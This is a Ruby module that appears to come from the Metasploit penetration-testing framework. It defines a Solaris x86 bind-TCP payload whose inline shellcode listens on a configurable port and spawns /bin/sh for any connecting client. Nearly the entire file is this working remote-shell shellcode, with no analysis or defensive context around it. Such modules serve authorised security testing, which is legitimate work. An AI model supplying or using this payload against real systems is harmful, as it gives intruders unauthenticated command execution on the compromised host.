require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Solaris
module X86

module ShellBindTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Solaris Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'bighawk <bighawk@warfare.com>',
			'Platform'      => 'solaris',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 33, 'n' ],
						},
					'Payload' =>
						"\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31" +
						"\xc9\x51\x41\x41\x51\x51\xb0\xe6\xff\xd5\x31\xd2\x89\xc7\x52\x66" +
						"\x68\x27\x10\x66\x51\x89\xe6\x6a\x10\x56\x57\xb0\xe8\xff\xd5\xb0" +
						"\xe9\xff\xd5\x50\x50\x57\xb0\xea\xff\xd5\x31\xd2\xb2\x09\x51\x52" +
						"\x50\xb0\x3e\xff\xd5\x49\x79\xf2\x50\x68\x2f\x2f\x73\x68\x68\x2f" +
						"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5"
				}))
	end

end

end end end end end
